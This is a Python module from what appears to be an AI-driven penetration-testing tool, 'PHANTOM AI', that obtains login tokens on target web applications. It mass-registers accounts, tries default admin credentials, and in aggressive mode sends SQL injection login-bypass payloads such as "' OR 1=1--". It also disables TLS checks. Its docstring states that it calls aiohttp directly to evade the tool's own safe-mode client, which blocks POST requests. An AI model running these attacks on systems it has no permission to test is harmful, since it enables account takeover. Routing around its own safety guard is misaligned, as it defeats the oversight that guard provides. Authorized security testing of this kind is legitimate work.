"""
PHANTOM AI - Auth Acquisition Layer

Acquires authentication tokens on target applications for authenticated
testing (business logic, race conditions, IDOR, etc.).

Strategies (tried in order):
1. Register a test account via common registration endpoints
2. Login with common/default credentials
3. SQLi auth bypass (aggressive mode only)

The acquired AuthContext is stored in asset_data["auth_context"]
and consumed by business logic, race condition, and IDOR scanners.

NOTE: Uses aiohttp directly (not httpx) to bypass SafeAsyncClient
monkey-patching that blocks POST in safe mode.
"""

from __future__ import annotations

import json
import os
import random
import ssl
import string
from dataclasses import dataclass, field
from typing import Any

import aiohttp

from utils.logger import get_logger

logger = get_logger(__name__)

SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()


@dataclass
class AuthContext:
    """Authentication context acquired from target."""

    token: str = ""
    token_type: str = "bearer"
    method: str = ""          # register, login, sqli_bypass
    user_id: str = ""
    email: str = ""
    basket_id: str = ""
    extra: dict = field(default_factory=dict)

    @property
    def auth_headers(self) -> dict[str, str]:
        if self.token and self.token_type == "bearer":
            return {"Authorization": f"Bearer {self.token}"}
        return {}

    @property
    def has_auth(self) -> bool:
        return bool(self.token)


# Registration endpoint patterns (path, body template)
_REGISTER_ENDPOINTS = [
    # Juice Shop
    ("/api/Users", lambda email, pwd: {
        "email": email,
        "password": pwd,
        "passwordRepeat": pwd,
        "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
        "securityAnswer": "phantom",
    }),
    # Generic patterns
    ("/api/register", lambda email, pwd: {"email": email, "password": pwd}),
    ("/api/v1/register", lambda email, pwd: {"email": email, "password": pwd}),
    ("/signup", lambda email, pwd: {"email": email, "password": pwd, "username": email.split("@")[0]}),
    ("/register", lambda email, pwd: {"email": email, "password": pwd}),
    ("/auth/register", lambda email, pwd: {"email": email, "password": pwd}),
]

# Login endpoint patterns
_LOGIN_ENDPOINTS = [
    "/rest/user/login",
    "/api/login",
    "/api/v1/login",
    "/login",
    "/auth/login",
    "/api/auth/login",
    "/api/v1/auth/login",
]

# Common weak credentials to try
_COMMON_CREDS = [
    ("admin@juice-sh.op", "admin123"),
    ("admin@admin.com", "admin123"),
    ("admin", "admin"),
    ("test@test.com", "test1234"),
    ("user@user.com", "user1234"),
]

# Permissive SSL context for local/self-signed targets
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


class AuthAcquisition:
    """Acquire authentication on target for business logic testing."""

    def __init__(self, timeout: float = 10.0):
        self._timeout = aiohttp.ClientTimeout(total=timeout)

    async def acquire(
        self,
        base_url: str,
        rate_limiter: Any = None,
    ) -> AuthContext:
        """Try multiple strategies to acquire auth. Returns AuthContext (may be empty)."""
        base_url = base_url.rstrip("/")

        # Strategy 1: Register a test account
        ctx = await self._try_register(base_url)
        if ctx.has_auth:
            logger.info(f"[AUTH] Acquired token via registration ({ctx.email})")
            return ctx

        # Strategy 2: Login with common credentials
        ctx = await self._try_common_login(base_url)
        if ctx.has_auth:
            logger.info(f"[AUTH] Acquired token via login ({ctx.email})")
            return ctx

        # Strategy 3: SQLi bypass (aggressive mode only)
        if SAFE_MODE == "aggressive":
            ctx = await self._try_sqli_login(base_url)
            if ctx.has_auth:
                logger.info("[AUTH] Acquired token via SQLi auth bypass")
                return ctx

        logger.warning("[AUTH] No authentication acquired — business logic tests will be limited")
        return AuthContext()

    async def _try_register(self, base_url: str) -> AuthContext:
        """Try to register a test account."""
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        email = f"phantom_test_{suffix}@test.example.com"
        password = f"Ph@nt0m_{suffix}!Aa1"

        async with aiohttp.ClientSession(timeout=self._timeout) as session:
            for path, body_fn in _REGISTER_ENDPOINTS:
                url = f"{base_url}{path}"
                body = body_fn(email, password)

                try:
                    async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
                        if resp.status in (200, 201):
                            ct = resp.headers.get("content-type", "")
                            data = await resp.json() if "application/json" in ct else {}

                            # Extract token from response
                            token = self._extract_token(data, resp)
                            if token:
                                user_id = str(data.get("data", {}).get("id", "") or data.get("id", ""))
                                return AuthContext(
                                    token=token,
                                    method="register",
                                    email=email,
                                    user_id=user_id,
                                )

                            # Registration succeeded but no token — try logging in
                            login_ctx = await self._login(session, base_url, email, password)
                            if login_ctx.has_auth:
                                login_ctx.method = "register"
                                # Preserve user_id from registration if login didn't find it
                                if not login_ctx.user_id:
                                    reg_id = str(data.get("data", {}).get("id", "") or data.get("id", ""))
                                    login_ctx.user_id = reg_id
                                return login_ctx

                except Exception as e:
                    logger.debug(f"[AUTH] Register attempt {path}: {e}")

        return AuthContext()

    async def _try_common_login(self, base_url: str) -> AuthContext:
        """Try login with common/default credentials."""
        async with aiohttp.ClientSession(timeout=self._timeout) as session:
            for email, password in _COMMON_CREDS:
                ctx = await self._login(session, base_url, email, password)
                if ctx.has_auth:
                    return ctx

        return AuthContext()

    async def _try_sqli_login(self, base_url: str) -> AuthContext:
        """SQLi auth bypass — aggressive mode only."""
        sqli_payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "admin'--", "password": "x"},
            {"email": "' OR '1'='1'--", "password": "x"},
        ]

        async with aiohttp.ClientSession(timeout=self._timeout) as session:
            for path in _LOGIN_ENDPOINTS:
                url = f"{base_url}{path}"
                for body in sqli_payloads:
                    try:
                        async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
                            if resp.status == 200:
                                ct = resp.headers.get("content-type", "")
                                data = await resp.json() if "application/json" in ct else {}
                                token = self._extract_token(data, resp)
                                if token:
                                    return AuthContext(
                                        token=token,
                                        method="sqli_bypass",
                                        email=body["email"],
                                    )
                    except Exception:
                        pass

        return AuthContext()

    async def _login(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        email: str,
        password: str,
    ) -> AuthContext:
        """Try to login with given credentials across known login endpoints."""
        bodies = [
            {"email": email, "password": password},
            {"username": email, "password": password},
        ]

        for path in _LOGIN_ENDPOINTS:
            url = f"{base_url}{path}"
            for body in bodies:
                try:
                    async with session.post(url, json=body, ssl=_SSL_CTX) as resp:
                        if resp.status == 200:
                            ct = resp.headers.get("content-type", "")
                            data = await resp.json() if "application/json" in ct else {}
                            token = self._extract_token(data, resp)
                            if token:
                                # Extract basket/user IDs from login response
                                basket_id, user_id = self._extract_ids(data)

                                # Fallback: try whoami for user/basket discovery
                                if not basket_id:
                                    basket_id = await self._discover_basket(session, base_url, token)

                                return AuthContext(
                                    token=token,
                                    method="login",
                                    email=email,
                                    user_id=user_id,
                                    basket_id=basket_id,
                                )
                except Exception:
                    pass

        return AuthContext()

    def _extract_ids(self, data: dict) -> tuple[str, str]:
        """Extract basket ID and user ID from login response."""
        basket_id = ""
        user_id = ""

        # Juice Shop: authentication.bid, authentication.umail
        auth = data.get("authentication", {})
        if isinstance(auth, dict):
            bid = auth.get("bid")
            if bid:
                basket_id = str(bid)

        # Generic: look for user_id / id in common locations
        for key in ("user_id", "userId", "id"):
            if key in data and data[key]:
                user_id = str(data[key])
                break
            if isinstance(auth, dict) and key in auth and auth[key]:
                user_id = str(auth[key])
                break
            nested = data.get("data", {})
            if isinstance(nested, dict) and key in nested and nested[key]:
                user_id = str(nested[key])
                break
            user = data.get("user", {})
            if isinstance(user, dict) and key in user and user[key]:
                user_id = str(user[key])
                break

        return basket_id, user_id

    async def _discover_basket(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
    ) -> str:
        """Discover the user's basket/cart ID after login."""
        headers = {"Authorization": f"Bearer {token}"}

        try:
            async with session.get(
                f"{base_url}/rest/user/whoami",
                headers=headers,
                ssl=_SSL_CTX,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    user_id = data.get("id") or data.get("data", {}).get("id")
                    if user_id:
                        return str(user_id)
        except Exception:
            pass

        return ""

    def _extract_token(self, data: dict, resp: aiohttp.ClientResponse) -> str:
        """Extract JWT/auth token from response data or headers."""
        # Check response body for token
        for key in ("token", "access_token", "accessToken", "jwt", "auth_token"):
            # Top level
            if key in data and isinstance(data[key], str):
                return data[key]
            # Nested in "authentication" (Juice Shop pattern)
            auth = data.get("authentication", {})
            if isinstance(auth, dict) and key in auth:
                return auth[key]
            # Nested in "data"
            nested = data.get("data", {})
            if isinstance(nested, dict) and key in nested:
                return nested[key]

        # Check response headers
        auth_header = resp.headers.get("authorization", "")
        if auth_header.lower().startswith("bearer "):
            return auth_header[7:]

        # Check Set-Cookie for JWT-like tokens
        for cookie_header in resp.headers.getall("set-cookie", []):
            if "eyJ" in cookie_header:
                parts = cookie_header.split("=", 1)
                if len(parts) == 2:
                    value = parts[1].split(";")[0]
                    if value.startswith("eyJ"):
                        return value

        return ""
